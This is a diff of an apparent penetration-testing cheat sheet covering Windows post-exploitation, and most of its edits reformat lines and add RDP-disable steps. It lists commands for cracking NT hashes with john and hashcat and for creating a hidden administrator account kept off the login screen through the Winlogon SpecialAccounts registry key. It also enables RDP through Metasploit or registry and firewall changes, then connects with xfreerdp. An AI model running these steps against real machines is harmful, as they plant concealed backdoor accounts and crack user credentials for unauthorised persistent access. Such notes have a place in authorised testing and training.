@@ -178,28 +178,31 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /f
 ---------------------------------------------------------------------------------------------------------------
 In meterpreter with administrator privs to enable RDP :
 1 - cracking current users's hash --> john <hash> --wordlist=/usr/share/wordlists/rockyou.txt --format=NT | hashcat <hash> -m 1000 /usr/share/wordlist/rockyou.txt
-or creating a Hidden user 
-net user <os> <123> /add /active:no
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
-net user <os> /active:yes
-net localgroup Administrators <os> /add
-net localgroup "Remote Desktop Users" <os> /add
+or creating a Hidden user :
+    net user <os> <123> /add /active:no
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
+    net user <os> /active:yes
+    net localgroup Administrators <os> /add
+    net localgroup "Remote Desktop Users" <os> /add
 2 - use post/windows/manage/enable_rdp
 3 - set session <id>
 4 - run 
 5 - from new terminal --> xfreerdp /u:<user> /v:<ip> /p:<password> 
 In a shell with administrator privs to enable RDP :
 1 - cracking current users's hash --> john <hash> --wordlist=/usr/share/wordlists/rockyou.txt --format=NT | hashcat <hash> -m 1000 /usr/share/wordlist/rockyou.txt
-or creating a Hidden user 
-net user <os> <123> /add /active:no
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
-net user <os> /active:yes
-net localgroup Administrators <os> /add
-net localgroup "Remote Desktop Users" os /add
+or creating a Hidden user :
+    net user <os> <123> /add /active:no
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v <os> /t REG_DWORD /d 0 /f
+    net user <os> /active:yes
+    net localgroup Administrators <os> /add
+    net localgroup "Remote Desktop Users" os /add
 2 - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 3 - netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 4 - to verify it's enabled if the value = 0 --> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
 5 - from new terminal --> xfreerdp /u:<user> /v:<ip> /p:<password> 
+To Disable the RDP with administrator privs:
+1 - reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+2 - netsh advfirewall firewall set rule group="remote desktop" new enable=No
 ---------------------------------------------------------------------------------------------------------------
 RDP externally after enable it on the target:
 sudo nano /etc/proxychains4.conf
